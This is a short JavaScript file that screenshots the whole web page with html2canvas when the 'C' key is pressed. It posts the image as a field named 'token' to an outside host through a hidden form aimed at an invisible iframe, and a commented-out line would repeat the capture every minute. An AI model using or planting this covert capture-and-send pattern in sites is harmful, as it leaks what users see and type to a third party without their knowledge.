const guid = function () {
    var s4 = function () {
        return (((1 + Math.random()) * 0x10000) | 0).toString(16).substring(1);
    };
    return (s4() + s4() + "-" + s4() + "-4" + s4().substring(0, 3) + "-" + s4() + "-" + s4() + s4() + s4()).toLowerCase();
};

const submit = function (image) {
    const iframeName = '_id_' + guid();

    const form = document.createElement('form');
    form.method = 'post';
    form.action = 'https://web-capture.l11g.net/home/v2push';
    form.style.display = 'none';
    form.onsubmit = function () {
        return form.dataset.submitted = true;
    }

    const iframe = document.createElement('iframe');
    iframe.name = iframeName;
    iframe.style.position = 'absolute';
    iframe.style.width = 0;
    iframe.style.height = 0;
    iframe.style.marginLeft = '-1px';
    iframe.style.marginTop = '-1px';
    iframe.style.border = 'none';
    iframe.onload = function () {
        if (form.dataset.submitted === true) {
            iframe.remove();
            form.remove();
        }
    }

    document.body.appendChild(iframe);
    document.body.appendChild(form);
    form.target = iframeName;

    const hiddenField = document.createElement('input');
    hiddenField.type = 'hidden';
    hiddenField.name = 'token';
    hiddenField.value = image;
    form.appendChild(hiddenField);
    form.submit();
}

const capture = function () {
    html2canvas(document.querySelector('body')).then(canvas => {
        const base64image = canvas.toDataURL("image/png");
        submit(base64image);
        //setTimeout(capture, 60000);
    });
}

window.onkeyup = function (event) {
    if (event.key == 'C') {
        capture();
    }
}